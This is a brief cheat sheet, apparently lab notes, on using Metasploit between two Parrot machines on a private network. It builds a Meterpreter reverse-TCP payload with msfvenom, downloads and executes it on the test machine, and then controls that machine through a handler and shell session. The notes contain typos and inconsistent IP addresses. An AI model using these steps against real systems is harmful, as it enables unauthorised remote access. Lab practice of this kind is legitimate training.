# How to use Metasploit

```bash
msfconsole

// understand the modules of Metasploit
cd /usr/share/metasploit -framework/modules/
ls

tree -L 1 exploits

banner

show -h
show exploits

search type:payload reverse_tco platform:linux


//creating payload
//Parrot Machine
info payloads/linux/x86/meterpreter_reverse_tcp

msfvenom --payload linux/x86/metarpreter_reverse_tcp 
--platform linux --arch x86 LHOST=192.168.56.101
LPORT=4444 --format elf --out ~/Desktop/evil

cd ~/Desktop
sudo python3 -m http.server 80

//Parrot-Test Machine
wget http://192.168.56.100:80/evil
ls

//wait reverse shell
//Parrot Machine
use exploit/multi/handler
set payload linux/x86/meterpreter_reverse_tcp
set LHOST 192.168.56.122
set LPORT 4444
show options
exploit
//become waiting state

//Parrot-Test Machine
ls -l evil
chmod +x evil
ls -l evil
./evil

//Parrot Machine
// change to (Meterpreter l)(/home/ipusiron) > prompt

//Parrot Test Machine
//start different terminal
lsof -i

//Parrot Machine
//manipulate Parrot Test Machine remotely
help 
pwd
cd ..
ls
cd ipusiron
ls
//get shell
getuid
shell
id
ip a
exit

//change to different meterpreter session
background
sessions -i
sessions -i 1
exit
exit
